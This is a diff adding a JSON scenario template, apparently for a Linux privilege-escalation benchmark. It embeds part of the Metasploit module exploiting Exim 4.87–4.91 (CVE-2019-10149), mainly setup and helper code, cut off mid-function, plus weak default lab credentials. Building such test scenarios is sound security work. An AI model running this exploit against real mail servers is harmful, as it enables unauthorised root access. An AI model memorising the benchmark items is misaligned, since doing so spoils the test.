@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47307",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Exim 4.87 / 4.91 - Local Privilege Escalation (Metasploit) (CVE-2019-10149)\n\nExploit source code (47307.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'expect'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Exim 4.87 - 4.91 Local Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a flaw in Exim versions 4.87 to 4.91 (inclusive).\n        Improper validation of recipient address in deliver_message()\n        function in /src/deliver.c may lead to command execution with root privileges\n        (CVE-2019-10149).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Qualys', # Discovery and PoC (@qualys)\n          'Dennis Herrmann', # Working exploit (@dhn)\n          'Marco Ivaldi', # Working exploit (@0xdea)\n          'Guillaume André' # Metasploit module (@yaumn_)\n        ],\n      'DisclosureDate' => '2019-06-05',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        =>\n        [\n          [\n            'Exim 4.87 - 4.91',\n            lower_version: Gem::Version.new('4.87'),\n            upper_version: Gem::Version.new('4.91')\n          ]\n        ],\n      'DefaultOptions' =>\n        {\n          'PrependSetgid' => true,\n          'PrependSetuid' => true\n        },\n      'References'     =>\n        [\n          [ 'CVE', '2019-10149' ],\n          [ 'EDB', '46996' ],\n          [ 'URL', 'https://www.openwall.com/lists/oss-security/2019/06/06/1' ]\n        ]\n    ))\n\n    register_options(\n      [\n        OptInt.new('EXIMPORT', [ true, 'The port exim is listening to', 25 ])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('ForceExploit', [ false, 'Force exploit even if the current session is root', false ]),\n        OptFloat.new('SendExpectTimeout', [ true, 'Timeout per send/expect when communicating with exim', 3.5 ]),\n        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n      ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def encode_command(cmd)\n    '\\x' + cmd.unpack('H2' * cmd.length).join('\\x')\n  end\n\n  def open_tcp_connection\n    socket_subsystem = Rex::Post::Meterpreter::Extensions::Stdapi::Net::Socket.new(client)\n      params = Rex::Socket::Parameters.new({\n        'PeerHost' => '127.0.0.1',\n        'PeerPort' => datastore['EXIMPORT']\n      })\n      begin\n        socket = socket_subsystem.create_tcp_client_channel(params)\n      rescue => e\n        vprint_error(\"Couldn't connect to port #{datastore['EXIMPORT']}, \"\\\n                    \"are you sure exim is listening on this port? (see EXIMPORT)\")\n        raise e\n      end\n    return socket_subsystem, socket\n  en\n```",
+  "cve": "CVE-2019-10149",
+  "exploitdb_id": "47307",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47307",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
